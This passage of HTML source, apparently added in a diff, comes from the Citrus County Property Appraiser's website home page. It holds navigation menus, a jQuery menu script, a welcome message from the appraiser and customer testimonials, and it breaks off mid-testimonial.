+<a href="/_dnn/LinkClick.aspx?fileticket=YwD6DLrKvlNuyDxk7hQL1Q%3d%3d&tabid=122&portalid=0" title="Citrus Lands" target="_blank"><span>Citrus Lands</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=Q59s7xZyT6JBFb-wEVzSCg%3d%3d&tabid=123&portalid=0" title="Commercial Horse Breeding Operation" target="_blank"><span>Commercial Horse Breeding Operation</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=-IvU4ISrYLarRlbFIZAyng%3d%3d&tabid=217&portalid=0" title="Apiculture (Bees)" target="_blank"><span>Apiculture (Bees)</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=cucnSFuSXtJj-Fd1rR3q1A%3d%3d&tabid=218&portalid=0" title="Commercial Goat-Sheep Operation" target="_blank"><span>Commercial Goat-Sheep Operation</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=RsJ_dUZ17scKssWULU6gjw%3d%3d&tabid=124&portalid=0" title="Miscellaneous Agriculture" target="_blank"><span>Miscellaneous Agriculture</span></a>
+</li>
+</ul>
+</div>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Tangible" title="Tangible"><span>Tangible</span></a>
+</li>
+ <li class="dir ">
+<a href="javascript:;" title="Maps"><span>Maps</span></a>
+ <div class="dnngo_menuslide">
+ <ul class="dnngo_slide_menu ">
+ <li class=" ">
+<a href="https://www.citruspa.org/_web/maps/mapadv.aspx" title="Map Search"><span>Map Search</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Downloads" title="Download GIS Map Data"><span>Download GIS Map Data</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Maps/Map-Ordering-Instructions" title="Map Ordering Instructions"><span>Map Ordering Instructions</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Maps/About-GIS" title="About GIS"><span>About GIS</span></a>
+</li>
+</ul>
+</div>
+</li>
+ <li class="dir ">
+<a href="javascript:;" title="General"><span>General</span></a>
+ <div class="dnngo_menuslide">
+ <ul class="dnngo_slide_menu ">
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Meet-Cregg-Dalton" title="Meet Cregg Dalton"><span>Meet Cregg Dalton</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/FAQ" title="FAQ"><span>FAQ</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/-Important-Dates" title=" Important Dates"><span>Important Dates</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Links" title="Links"><span>Links</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Brochures-and-Publications" title="Brochures and Publications"><span>Brochures and Publications</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Taxroll-Information" title="Taxroll Information"><span>Taxroll Information</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=aRyubvFIgvC2_yuSPZ5G7Q%3d%3d&tabid=178&portalid=0" title="Sales Qualification Letter" target="_blank"><span>Sales Qualification Letter</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=JJCIV8Ipm8ImOHhVVRlLEA%3d%3d&tabid=179&portalid=0" title="Public Records Custodian Contact" target="_blank"><span>Public Records Custodian Contact</span></a>
+</li>
+ <li class=" ">
+<a href="http://citrusclerk.org/216/Value-Adjustment-Board" title="Value Adjustment Board" target="_blank"><span>Value Adjustment Board</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=_Wf59PVip8-81MnfZD4JLA%3d%3d&tabid=181&portalid=0" title="Budget Transparency" target="_blank"><span>Budget Transparency</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Confidential-Accounts" title="Confidential Accounts"><span>Confidential Accounts</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=ZxM1NRkH0F-BO9S6g5glng%3d%3d&tabid=208&portalid=0" title="Millage Rates" target="_blank"><span>Millage Rates</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.disasterassistance.gov/" title="Disaster Assistance" target="_blank"><span>Disaster Assistance</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Forms" title="Forms"><span>Forms</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/General/Property-Owner-Bill-of-Rights" title="Property Owner Bill of Rights"><span>Property Owner Bill of Rights</span></a>
+</li>
+</ul>
+</div>
+</li>
+</ul>
+
+      
+    </div> 
+    
+    
+<script type="text/javascript">
+    jQuery(document).ready(function ($) {
+        $("#dnngo_megamenu030a208937").dnngomegamenu({
+            slide_speed: 200,
+            delay_disappear: 500,
+            popUp: "vertical",//level
+			delay_show:150,
+			direction:"ltr",//rtl ltr
+			megamenuwidth:"box",//full box
+			WidthBoxClassName:"#megamenuWidthBox"
+        });
+    });
+
+
+	jQuery(document).ready(function () {
+		jQuery("#dnngo_megamenu030a208937").has("ul").find(".dir > a").attr("aria-haspopup", "true");
+	}); 
+
+</script></div></div></div></div> <div class="header-area area-right header-horizontal  header-horizontal" id="column-722316"><div class="header-content-wrap"> </div></div> </div></div></div>  </header></div><div class="mobile-header-replace"><header class="mobile-header floating-nav"> <div class="header-mobile-bg mobile-header-shadow" id="mobileheader-639685"><div class="header-mobile"> <div class="header-area area-left header-horizontal text-left header-horizontal text-left" id="column-615625"><div class="header-content-wrap"> <div class="logo" id="logo712896"><a id="dnn_dnnLOGO712896_hypLogo" title="Citrus County Property Appraiser" aria-label="Citrus County Property Appraiser" href="https://www.citruspa.org/_dnn/"><img id="dnn_dnnLOGO712896_imgLogo" class="header-logo" src="/_dnn/Portals/0/citrus-county-logo.png?ver=pwAlAG5QYHzvkRfF7Nv6Xw%3d%3d" alt="Citrus County Property Appraiser" style="border-width:0px;"></a><a id="dnn_floatingLOGO712896_hypLogo" title="Citrus County Property Appraiser" aria-label="Citrus County Property Appraiser" href="https://www.citruspa.org/_dnn/"><img id="dnn_floatingLOGO712896_imgLogo" class="floating-header-logo" src="/_dnn/Portals/0/citrus-county-logo.png?ver=pwAlAG5QYHzvkRfF7Nv6Xw%3d%3d" alt="Citrus County Property Appraiser" style="border-width:0px;"></a></div></div></div> <div class="header-area area-center header-horizontal  header-horizontal" id="column-946586"><div class="header-content-wrap"> </div></div> <div class="header-area area-right header-horizontal text-right header-horizontal text-right" id="column-62191"><div class="header-content-wrap"> <div class="mobile-menu-icon" data-navbartitle="Menu"><span class="dg-menu-anime"><i></i></span></div>
+<a href="#gomenu57b1b4d77a" class="mobilemenu_close" aria-label="Close"></a>
+<div class="dng-mobilemenu mobile_menu mobilemenu11098">
+    <ul class="menu_list"><li class="dir   first-item Item-1 "><a href="javascript:;" title="Parcel Search"><span>Search</span></a><ul><li class="   first-item SunItem-1 "><a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=owner" title="Owner Search"><span>Owner Search</span></a></li><li class="   SunItem-2 "><a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=address" title="Address Search"><span>Address Search</span></a></li><li class="   SunItem-3 "><a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=realprop" title="Real Property Search"><span>Real Property Search</span></a></li><li class="   SunItem-4 "><a href="http://www.citruspa.org/_web/search/advancedsearch.aspx?mode=advanced" title="Advanced Search"><span>Advanced Search</span></a></li><li class="   SunItem-5 "><a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=persprop" title="Personal Property Search"><span>Personal Property Search</span></a></li><li class="   SunItem-6 "><a href="/_dnn/LinkClick.aspx?fileticket=RaxIWSv5Yhd1WiXmS0SZvQ%3d%3d&tabid=143&portalid=0" title="Search Help" target="_blank"><span>Search Help</span></a></li><li class="   last-item SunItem-7 "><a href="https://www.citruspa.org/_dnn/Downloads" title="Database Codes"><span>Database Codes</span></a></li></ul></li><li class="dir   Item-2 "><a href="javascript:;" title="Exemptions"><span>Exemptions</span></a><ul><li class="   first-item SunItem-1 "><a href="https://www.citruspa.org/_dnn/Exemptions/General-Exemption-Information" title="General Exemptions Information"><span>General Exemption Information</span></a></li><li class="   SunItem-2 "><a href="https://www.citruspa.org/_dnn/Exemptions/Homestead-Application" title="Homestead Application" target="_blank"><span>Homestead Application</span></a></li><li class="   SunItem-3 "><a href="https://www.citruspa.org/_dnn/Exemptions/Homestead-E-File/Efile1" title="Homestead E-File"><span>Homestead E-File</span></a></li><li class="   SunItem-4 "><a href="/_dnn/LinkClick.aspx?fileticket=jB8fuZJR-wPkWRIWwfphRw%3d%3d&tabid=219&portalid=0" title="Widow/Widower Application Form" target="_blank"><span>Widow/Widower Application Form</span></a></li><li class="   SunItem-5 "><a href="/_dnn/LinkClick.aspx?fileticket=gt4RS44NoauS1bGLkaIvIw%3d%3d&tabid=220&portalid=0" title="Totally & Permanently Disabled Application Form" target="_blank"><span>Totally & Permanently Disabled Application Form</span></a></li><li class="   SunItem-6 "><a href="/_dnn/LinkClick.aspx?fileticket=Rqjoux02N9F6GED_3bo9lg%3d%3d&tabid=163&portalid=0" title="Portability" target="_blank"><span>Portability</span></a></li><li class="   SunItem-7 "><a href="https://www.citruspa.org/_dnn/Exemptions/Annual-Assessment-Caps" title="Annual Assessment Caps"><span>Annual Assessment Caps</span></a></li><li class="   SunItem-8 "><a href="/_dnn/LinkClick.aspx?fileticket=2xsX18clhT5yGyOiAOFL6A%3d%3d&tabid=99&portalid=0" title="Application for Veterans over 65 discount" target="_blank"><span>Application for Veterans over 65 discount</span></a></li><li class="   SunItem-9 "><a href="http://floridarevenue.com/property/Documents/dr501m.pdf" title="Deployed Military Exemption  Application" target="_blank"><span>Deployed Military Exemption  Application</span></a></li><li class="   SunItem-10 "><a href="https://floridarevenue.com/property/Pages/Home.aspx" title="FL DOR Exemption Information For Taxpayers" target="_blank"><span>FL DOR Exemption Information For Taxpayers</span></a></li><li class="   SunItem-11 "><a href="http://floridarevenue.com/property/Documents/pt109.pdf" title="Active Duty Military and Veterans" target="_blank"><span>Active Duty Military and Veterans</span></a></li><li class="   SunItem-12 "><a href="/_dnn/LinkClick.aspx?fileticket=b9UMRwyTy5v3uxuqjnWNAA%3d%3d&tabid=159&portalid=0" title="Veterans Exemptions Brochure" target="_blank"><span>Veterans Exemptions Brochure</span></a></li><li class="   last-item SunItem-13 "><a href="https://www.citruspa.org/_dnn/Exemptions/Exemption-Fraud" title="Exemption Fraud"><span>Exemption Fraud</span></a></li></ul></li><li class="dir   Item-3 "><a href="javascript:;" title="Agriculture"><span>Agriculture</span></a><ul><li class="   first-item SunItem-1 "><a href="https://www.citruspa.org/_dnn/Agriculture/Agriculture-Info" title="Agriculture Info"><span>Agriculture Info</span></a></li><li class="   SunItem-2 "><a href="https://www.citruspa.org/_dnn/Agriculture/Ag-Application" title="Ag Application"><span>Ag Application</span></a></li><li class="   SunItem-3 "><a href="https://www.citruspa.org/_dnn/Agriculture/Ag-FAQ" title="Ag F.A.Q."><span>Ag F.A.Q.</span></a></li><li class="   SunItem-4 "><a href="/_dnn/LinkClick.aspx?fileticket=jUznvBMoHUutwxj5xBJJ-A%3d%3d&tabid=104&portalid=0" title="Agriculture Guidelines" target="_blank"><span>Agriculture Guidelines</span></a></li><li class="   SunItem-5 "><a href="https://www.citruspa.org/_dnn/Agriculture/Ag-Assistance-Links" title="Ag Assistance Links"><span>Ag Assistance Links</span></a></li><li class="   SunItem-6 "><a href="/_dnn/LinkClick.aspx?fileticket=pCVayOCzfPMX_k51tELc9A%3d%3d&tabid=119&portalid=0" title="Pasture Land" target="_blank"><span>Pasture Land</span></a></li><li class="   SunItem-7 "><a href="/_dnn/LinkClick.aspx?fileticket=X-1iOiQNG81RmejtRkoM3g%3d%3d&tabid=118&portalid=0" title="Cropland" target="_blank"><span>Cropland</span></a></li><li class="   SunItem-8 "><a href="/_dnn/LinkClick.aspx?fileticket=hkOWpILef-GrZIV2RaMxug%3d%3d&tabid=120&portalid=0" title="Timberlands" target="_blank"><span>Timberlands</span></a></li><li class="   SunItem-9 "><a href="/_dnn/LinkClick.aspx?fileticket=PROb55f-5XsQ-oyCRcdhZw%3d%3d&tabid=121&portalid=0" title="Commercial Plant Nursery Operation" target="_blank"><span>Commercial Plant Nursery Operation</span></a></li><li class="   SunItem-10 "><a href="/_dnn/LinkClick.aspx?fileticket=YwD6DLrKvlNuyDxk7hQL1Q%3d%3d&tabid=122&portalid=0" title="Citrus Lands" target="_blank"><span>Citrus Lands</span></a></li><li class="   SunItem-11 "><a href="/_dnn/LinkClick.aspx?fileticket=Q59s7xZyT6JBFb-wEVzSCg%3d%3d&tabid=123&portalid=0" title="Commercial Horse Breeding Operation" target="_blank"><span>Commercial Horse Breeding Operation</span></a></li><li class="   SunItem-12 "><a href="/_dnn/LinkClick.aspx?fileticket=-IvU4ISrYLarRlbFIZAyng%3d%3d&tabid=217&portalid=0" title="Apiculture (Bees)" target="_blank"><span>Apiculture (Bees)</span></a></li><li class="   SunItem-13 "><a href="/_dnn/LinkClick.aspx?fileticket=cucnSFuSXtJj-Fd1rR3q1A%3d%3d&tabid=218&portalid=0" title="Commercial Goat-Sheep Operation" target="_blank"><span>Commercial Goat-Sheep Operation</span></a></li><li class="   last-item SunItem-14 "><a href="/_dnn/LinkClick.aspx?fileticket=RsJ_dUZ17scKssWULU6gjw%3d%3d&tabid=124&portalid=0" title="Miscellaneous Agriculture" target="_blank"><span>Miscellaneous Agriculture</span></a></li></ul></li><li class="   Item-4 "><a href="https://www.citruspa.org/_dnn/Tangible" title="Tangible"><span>Tangible</span></a></li><li class="dir   Item-5 "><a href="javascript:;" title="Maps"><span>Maps</span></a><ul><li class="   first-item SunItem-1 "><a href="https://www.citruspa.org/_web/maps/mapadv.aspx" title="Map Search"><span>Map Search</span></a></li><li class="   SunItem-2 "><a href="https://www.citruspa.org/_dnn/Downloads" title="Download GIS Map Data"><span>Download GIS Map Data</span></a></li><li class="   SunItem-3 "><a href="https://www.citruspa.org/_dnn/Maps/Map-Ordering-Instructions" title="Map Ordering Instructions"><span>Map Ordering Instructions</span></a></li><li class="   last-item SunItem-4 "><a href="https://www.citruspa.org/_dnn/Maps/About-GIS" title="About GIS"><span>About GIS</span></a></li></ul></li><li class="dir   last-item Item-6 "><a href="javascript:;" title="General"><span>General</span></a><ul><li class="   first-item SunItem-1 "><a href="https://www.citruspa.org/_dnn/General/Meet-Cregg-Dalton" title="Meet Cregg Dalton"><span>Meet Cregg Dalton</span></a></li><li class="   SunItem-2 "><a href="https://www.citruspa.org/_dnn/General/FAQ" title="FAQ"><span>FAQ</span></a></li><li class="   SunItem-3 "><a href="https://www.citruspa.org/_dnn/General/-Important-Dates" title=" Important Dates"><span>Important Dates</span></a></li><li class="   SunItem-4 "><a href="https://www.citruspa.org/_dnn/General/Links" title="Links"><span>Links</span></a></li><li class="   SunItem-5 "><a href="https://www.citruspa.org/_dnn/General/Brochures-and-Publications" title="Brochures and Publications"><span>Brochures and Publications</span></a></li><li class="   SunItem-6 "><a href="https://www.citruspa.org/_dnn/General/Taxroll-Information" title="Taxroll Information"><span>Taxroll Information</span></a></li><li class="   SunItem-7 "><a href="/_dnn/LinkClick.aspx?fileticket=aRyubvFIgvC2_yuSPZ5G7Q%3d%3d&tabid=178&portalid=0" title="Sales Qualification Letter" target="_blank"><span>Sales Qualification Letter</span></a></li><li class="   SunItem-8 "><a href="/_dnn/LinkClick.aspx?fileticket=JJCIV8Ipm8ImOHhVVRlLEA%3d%3d&tabid=179&portalid=0" title="Public Records Custodian Contact" target="_blank"><span>Public Records Custodian Contact</span></a></li><li class="   SunItem-9 "><a href="http://citrusclerk.org/216/Value-Adjustment-Board" title="Value Adjustment Board" target="_blank"><span>Value Adjustment Board</span></a></li><li class="   SunItem-10 "><a href="/_dnn/LinkClick.aspx?fileticket=_Wf59PVip8-81MnfZD4JLA%3d%3d&tabid=181&portalid=0" title="Budget Transparency" target="_blank"><span>Budget Transparency</span></a></li><li class="   SunItem-11 "><a href="https://www.citruspa.org/_dnn/General/Confidential-Accounts" title="Confidential Accounts"><span>Confidential Accounts</span></a></li><li class="   SunItem-12 "><a href="/_dnn/LinkClick.aspx?fileticket=ZxM1NRkH0F-BO9S6g5glng%3d%3d&tabid=208&portalid=0" title="Millage Rates" target="_blank"><span>Millage Rates</span></a></li><li class="   SunItem-13 "><a href="https://www.disasterassistance.gov/" title="Disaster Assistance" target="_blank"><span>Disaster Assistance</span></a></li><li class="   SunItem-14 "><a href="https://www.citruspa.org/_dnn/General/Forms" title="Forms"><span>Forms</span></a></li><li class="   last-item SunItem-15 "><a href="https://www.citruspa.org/_dnn/General/Property-Owner-Bill-of-Rights" title="Property Owner Bill of Rights"><span>Property Owner Bill of Rights</span></a></li></ul></li></ul>
+</div>
+ 
+
+
+
+ </div></div> </div></div> </header></div><div id="dnn_BannerPane" class="BannerPane DNNEmptyPane"></div>
+ 
+    <section id="dnn_content">   
+
+        
+        
+        
+         
+ 
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <div id="dnn_ContentPane" class="ContentPane DNNEmptyPane"></div>
+          </div>
+        </div>
+      </div>
+
+         <div class="container-fluid row-no-spacing " id="row-240700"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-923076"> <div class="inner-row-box custom-css " id="row-725671"><div class="dng-row row column-gap-4"> <div class="dng-column col-md-12"><div class="dng-column-inner pr-0 pl-0 mr-0 ml-0 width-100" id="column-354215"> <div id="dnn_ImportantNotice" class="panebox ImportantNotice pr-0 pl-0 mr-0 ml-0 width-100 text-center DNNEmptyPane"></div></div></div> </div></div> <div class="inner-row-box custom-css " id="row-335258"><div class="dng-row row column-gap-0"> <div class="dng-column col-md-4 modh1"><div class="dng-column-inner " id="column-27864"> <div id="dnn_PaneAA" class="panebox PaneAA"><div class="DnnModule DnnModule-DNN_HTML DnnModule-718 DnnVersionableControl"><a name="718"></a>
+<div class="White">
+     <div id="dnn_ctr718_ContentPane" class="contentpane"><!-- Start_Module_718 --><div id="dnn_ctr718_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr718_HtmlModule_lblContent" class="Normal">
+	<div class="dg-title subtitle-style01 text-center title-style04">
+<h1 class="title ">Search</h1>
+<span class="decorated r"></span></div>
+
+<div style="max-width:270px; margin: 0 auto;">
+<div class="dng-list list-icon em-background line-solid">
+<ul>
+ <li><i class="fas fa-user"></i><a href="https://www.citruspa.org/_web/search/commonsearch.aspx?mode=owner" target="_blank">Owner Search</a></li>
+ <li><i class="fas fa-home"></i><a href="https://www.citruspa.org/_web/search/commonsearch.aspx?mode=address" target="_blank">Address Search</a></li>
+ <li><i class="fas fa-map-marker-alt"></i><a href="https://www.citruspa.org/_web/search/commonsearch.aspx?mode=realprop" target="_blank">Real Property Search</a></li>
+ <li><i class="fas fa-search-plus"></i><a href="https://www.citruspa.org/_web/search/advancedsearch.aspx?mode=advanced" target="_blank">Advanced Search</a></li>
+ <li><i class="fas fa-map-marked-alt"></i><a href="https://www.citruspa.org/_web/search/commonsearch.aspx?mode=persprop" target="_blank">Personal Property Search</a></li>
+ <li><i class="far fa-question-circle"></i><a href="/_dnn/Portals/0/pdfs/SearchHelp.pdf?ver=2019-01-29-065344-000" target="_blank">Search Help</a></li>
+</ul>
+</div>
+</div>
+
+</div>
+
+</div><!-- End_Module_718 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div><div class="dng-column col-md-4 modh1"><div class="dng-column-inner " id="column-863375"> <div id="dnn_PaneAB" class="panebox PaneAB"><div class="DnnModule DnnModule-DNN_HTML DnnModule-617 DnnVersionableControl"><a name="617"></a>
+<div class="White">
+     <div id="dnn_ctr617_ContentPane" class="contentpane"><!-- Start_Module_617 --><div style="max-width: 530px; margin: 0 auto;"><div id="dnn_ctr617_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr617_HtmlModule_lblContent" class="Normal">
+	<div class="dg-title subtitle-style01 text-center title-style04">
+<h1 class="title ">Welcome</h1>
+<span class="decorated r"></span></div>
+
+<p>Welcome to the Citrus County Property Appraiser Website</p>
+
+<p>We invite you to explore the many services available on our website. It is provided as a service to our customers, the community and the public abroad, to assist in obtaining property ownership information, assessment roll data, building sketches, sales data, parcel ownership maps, aerials and other information on properties within Citrus County, Florida.</p>
+
+<p>We welcome your comments and suggestions on how we may better serve you. If you need additional information, please contact our office directly.</p>
+
+<p style="text-align: center;">Sincerely,<br>
+Cregg E. Dalton, CFA, MBA<br>
+<a href="/_dnn/General/Meet-Cregg-Dalton"><i class="far fa-handshake"></i> Meet Cregg</a> | <a href="/_dnn/Email-Us"><i class="far fa-envelope"></i> Contact</a><br>
+<img alt="Cregg E. Dalton" src="/_dnn/portals/0/Images/CD1 - Copy.jpg" style="width: 135px; height: 136px; margin-top: 10px; margin-bottom: 10px;" title="Cregg E. Dalton"><a href="/_DNN/Portals/0/CEAA%20%281%29.pdf" target="_blank"><img alt="" src="/_dnn/portals/0/Untitled%20design%20%2837%29.png" style="width: 135px; height: 136px;" title=""></a></p>
+
+</div>
+
+</div></div><!-- End_Module_617 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div><div class="dng-column col-md-4 modh1"><div class="dng-column-inner " id="column-497940"> <div id="dnn_PaneAC" class="panebox PaneAC"><div class="DnnModule DnnModule-DNN_HTML DnnModule-620 DnnVersionableControl"><a name="620"></a>
+<div class="White">
+     <div id="dnn_ctr620_ContentPane" class="contentpane"><!-- Start_Module_620 --><div id="dnn_ctr620_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr620_HtmlModule_lblContent" class="Normal">
+	<div class="dg-title subtitle-style01 text-center title-style04">
+<h1 class="title ">Quick Links</h1>
+<span class="decorated r"></span></div>
+
+<div style="max-width: 310px; margin: 0 auto;">
+<p style="text-align: center;"><a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Exemptions/Homestead-E-File/Efile1"><i class="fas fa-home"></i> File Homestead Online</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Address-Change"><i class="fas fa-mail-bulk"></i> Change Mailing Address</a> <a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Notice-of-Proposed-Taxes">2026 TRIM Notices</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Tax-Portability-Estimator"><i class="fas fa-calculator"></i> Tax &amp; Portability Estimator</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/StormDamage">Catastrophic Event Damage Report</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Downloads"><i class="far fa-arrow-alt-circle-down "></i> Data Downloads</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Employment-Opportunities"><i class="far fa-lightbulb"></i> Employment Opportunities</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Accessibility"><i class="fas fa-child "></i> Accessibility</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/General/E-newsletters-Sign-up"><i class="fas fa-mail-bulk"></i> E-Newsletter Sign Up</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/Training-Session-Sign-Up"><i class="fas fa-mail-bulk"></i> Training Session Sign Up</a><br>
+<a class="dg-btn-3 size-md radius-3px btn-accent " href="/_dnn/General/Contact"><i class="fas fa-mail-bulk"></i> Contact Us</a></p>
+</div>
+
+</div>
+
+</div><!-- End_Module_620 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div> </div></div> </div></div> </div></div></div> <div class="container-fluid row-no-spacing " id="row-102645"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-278635"> <div id="dnn_PaneA" class="panebox PaneA"><div class="DnnModule DnnModule-DNN_HTML DnnModule-730 DnnVersionableControl"><a name="730"></a>
+<div class="White">
+     <div id="dnn_ctr730_ContentPane" class="contentpane"><!-- Start_Module_730 --><div style="padding: 20px 30px 18px 30px;"><div id="dnn_ctr730_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr730_HtmlModule_lblContent" class="Normal">
+	<div style="padding-top: 57px; padding-bottom: 23px;">
+<h2 style="text-align: center;">File for Homestead Online Today. It&#39;s Easy!</h2>
+
+<p style="text-align: center;"><a class="dg-btn-3 radius-3px btn-accent " href="/_dnn/Exemptions/Homestead-E-File/efile1">File Now and Save Money</a></p>
+
+<div style="max-width: 350px; margin: 0 auto;">
+<hr></div>
+</div>
+
+<div class="row">
+<div class="col-md-4 col-12 center">
+<div class="focus-cards">
+<p style="text-align: center;"><a href="/_dnn/E-newsletters-Sign-up" target=""><img alt="E-Newsletter" src="/_dnn/portals/0/newsletterpic_1.png" style="width: 500px; height: 350px;" title="E-Newsletter"></a></p>
+
+<h3 style="text-align: center;">E-NEWSLETTER</h3>
+
+<div class="text-center" style="text-align: center;"><a class="dg-btn-3 radius-3px btn-accent2" href="/_dnn/E-newsletters-Sign-up"><span>LEARN MORE</span></a></div>
+
+<div class="text-center" style="text-align: center;"></div>
+</div>
+</div>
+
+<div class="col-md-4 col-12 center">
+<div class="focus-cards">
+<p style="text-align: center;"><a href="/_dnn/General/Brochures-and-Publications" title="Brochures"><img alt="Brochures" src="/_dnn/portals/0/Webp_net-resizeimage.jpg" style="width: 500px; height: 350px;" title="Brochures"></a></p>
+
+<h3 style="text-align: center;">BROCHURES</h3>
+
+<div class="text-center" style="text-align: center;"><a class="dg-btn-3 radius-3px btn-accent2" href="/_dnn/General/Brochures-and-Publications"><span>LEARN MORE</span></a></div>
+</div>
+</div>
+
+<div class="col-md-4 col-12 center">
+<div class="focus-cards">
+<p style="text-align: center;"><a href="/_dnn/F-E-Articles" title="Downloads"><img alt="Downloads" src="/_dnn/portals/0/unnamed.png" style="width: 500px; height: 350px;" title="Downloads"></a></p>
+
+<h3 style="text-align: center;">F&amp;E Articles</h3>
+
+<div class="text-center" style="text-align: center;"><a class="dg-btn-3 radius-3px btn-accent2" href="/_dnn/F-E-Articles"><span>LEARN MORE</span></a></div>
+</div>
+</div>
+</div>
+
+</div>
+
+</div></div><!-- End_Module_730 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div><div class="inner-row-box custom-css margin-reset-lg margin-reset-xl margin-reset-md margin-reset-sm" id="row-697879"><div class="dng-row row column-gap-0"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-613804"> </div></div> <div class="dng-column col-md-4"><div class="dng-column-inner " id="column-393659"> <div id="dnn_PaneB" class="panebox PaneB DNNEmptyPane"></div></div></div><div class="dng-column col-md-4"><div class="dng-column-inner " id="column-703445"> <div id="dnn_PaneC" class="panebox PaneC DNNEmptyPane"></div></div></div><div class="dng-column col-md-4"><div class="dng-column-inner " id="column-880618"> <div id="dnn_PaneD" class="panebox PaneD DNNEmptyPane"></div></div></div> </div></div> <div id="dnn_PaneE" class="panebox PaneE DNNEmptyPane"></div></div></div> </div></div></div> <div class="container-fluid col-no-padding " id="row-47338"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-937484"> <div id="dnn_PaneAD" class="panebox PaneAD DNNEmptyPane"></div></div></div> </div></div> <div class="container-fluid row-no-spacing " id="row-238711"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-933416"> <div id="dnn_PaneF" class="panebox PaneF"><div class="DnnModule DnnModule-DNN_HTML DnnModule-725 DnnVersionableControl"><a name="725"></a>
+<div class="White">
+     <div id="dnn_ctr725_ContentPane" class="contentpane"><!-- Start_Module_725 --><div style="max-width: 1000px; margin: 0 auto;"><div style="padding-top: 51px; padding-bottom: 70px;"><div id="dnn_ctr725_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr725_HtmlModule_lblContent" class="Normal">
+	<div class="swiper-container color-dark dg-testimonials04 default_nav dots-pos-center" data-autoplay="{&quot;delay&quot;:5000}" data-buttonoffset="[-60,-12]" data-effect="slide" data-itemwidth="[100,100,100,100,100,100]" data-mousewheel="false" data-responsive="[1600,1200,992,768,480]" data-speed="250">
+<div class="swiper-wrapper">
+<div class="item width-90">
+<blockquote>
+<p>&ldquo;Ataly was very pleasant and helpful.&rdquo;</p>
+
+<footer><span class="info">
+        <strong>David B</strong></span></footer>
+</blockquote>
+</div>
+
+<div class="item width-90">
+<blockquote>
+<p>&ldquo;Amy was patient, kind and helpful. Very positive experience. Thank you!&rdquo;</p>
+</blockquote>
+</div>
+
+<div class="item width-90">
+<blockquote>
+<p>&ldquo;Sharon and Nic were both wonderful! Super helpful and friendly. Thank you both for your help!&rdquo;</p>
+
+<footer><span class="info">
+        <strong>Jennifer O</strong></span></footer>
+</blockquote>
+</div>
+
+<div class="item width-90">
+<blockquote>
+<p>&ldquo;Emily was very helpful during this trying time. Thank you!&rdquo;</p>
+
+<footer><span class="info">
+        <strong>Ted T</strong></span></footer>
+</blockquote>
+</div>
+
+<div class="item width-90">
+<blockquote>
